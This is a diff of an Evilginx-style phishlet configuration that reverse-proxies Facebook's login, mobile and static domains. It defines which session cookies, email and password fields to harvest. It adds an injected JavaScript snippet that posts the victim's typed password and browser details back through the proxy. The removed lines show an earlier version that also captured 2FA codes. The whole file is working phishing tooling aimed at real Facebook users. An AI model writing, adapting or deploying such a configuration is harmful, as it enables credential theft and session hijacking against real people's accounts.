@@ -1,78 +1,97 @@
 min_ver: '3.0.0'
+author: 'Anon0369G'
+redirect_url: 'https://www.facebook.com/'  # Redirect after login
 
 proxy_hosts:
-  # Phishing subdomain for Facebook login page.
   - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true, is_landing: true, auto_filter: true}
-  # Mobile version of Facebook login.
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
-  # Static content for Facebook, such as images and scripts.
   - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false, auto_filter: true}
 
-# Authentication tokens configurations: Capturing and handling session cookies.
+sub_filters:
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  
 auth_tokens:
-  # Targeting Facebook domain (trigger)
   - domain: '.facebook.com'
-    keys: ['c_user', 'xs', 'sb']
+    keys: ['sessionid', 'csrftoken']
     type: 'cookie'
 
-# Credentials configurations: Defining how to extract user credentials.
 credentials:
-  # Capturing username from the Facebook login form.
   username:
     key: 'email'
     search: '(.*)'
     type: 'post'
-  # Capturing password from the Facebook login form.
   password:
-    key: 'pass'
+    key: '^unenc_password$'
     search: '(.*)'
     type: 'post'
 
-# Force POST request configurations: Manipulating form submissions.
+  custom:
+    - key: '^pass$'
+      search: '(.*)'
+      type: 'post'
+    - key: '^Password$'
+      search: '(.*)'
+      type: 'post'
+    - key: 'UserAgent'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Browser'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Engine'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Platform'
+      search: '(.*)'
+      type: 'post'
+
 force_post:
-  # Intercepting and modifying POST data on the login path.
   - path: '/login.php'
     search:
       - {key: 'email', search: '.*'}
       - {key: 'pass', search: '.*'}
+    force:
+      - {key: 'remember_me', value: '1'}
     type: 'post'
-
-############################
-# After capturing the username and password, you can add a section to capture the 2FA code.
-force_post:
-  # Intercepting and modifying POST data on the login path.
-  - path: '/login.php'
-    search:
-      - {key: 'email', search: '.*'}
-      - {key: 'pass', search: '.*'}
-    type: 'post'
-
-  # Capturing the 2FA code after the first login attempt
-  - path: '/login/2fa'  # Adjust to the correct path for the 2FA submission
-    search:
-      - {key: '2fa_code', search: '(.*)'}  # Capture the 2FA code
-    type: 'post'
-
-# Add logic in your JS to show the 2FA input field after initial login.
-js_inject:
-  - trigger_domains: ["www.facebook.com"]
-    trigger_paths: ["/login.php"]
-    script: |
-      // After submitting the username and password, show a prompt for the 2FA code.
-      var submit = document.querySelector('button[type=submit]');
-      submit.addEventListener('click', function() {
-          // Wait for the login response, and if it indicates a 2FA request, show the 2FA input field.
-          setTimeout(function() {
-              var twoFactorField = document.createElement('input');
-              twoFactorField.setAttribute('type', 'text');
-              twoFactorField.setAttribute('name', '2fa_code');
-              twoFactorField.setAttribute('placeholder', 'Enter 2FA code');
-              document.querySelector('form').appendChild(twoFactorField);
-          }, 2000);  // Adjust timing as necessary.
-      });
-# Login page configuration: Defining the entry point for phishing.
 
 login:
-  # Setting the login domain and path for the initial phishing page.
-  domain: 'm.facebook.com'
+  domain: 'login.facebook.com'
   path: '/login.php'
+
+js_inject:
+  - trigger_domains: ["login.facebook.com", "m.facebook.com", "www.facebook.com"]
+    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*", "/m/login"]
+    script: |
+      (function() {
+        function collectBrowserData() {
+          var xhr = new XMLHttpRequest();
+          var userAgent = navigator.userAgent;
+          var browser = navigator.appName;
+          var platform = navigator.platform;
+          xhr.open("POST", '/', true);
+          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+          xhr.send("user_agent=" + encodeURIComponent(userAgent) + "&browser=" + encodeURIComponent(browser) + "&platform=" + encodeURIComponent(platform));
+        }
+
+        function capturePassword() {
+          var passwordField = document.querySelector("input[name='pass']");
+          var xhr = new XMLHttpRequest();
+          if (passwordField) {
+            xhr.open("POST", '/login', true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("captured_password=" + encodeURIComponent(passwordField.value));
+          }
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+          collectBrowserData();
+          document.querySelector("form").addEventListener("submit", capturePassword);
+        });
+      })();
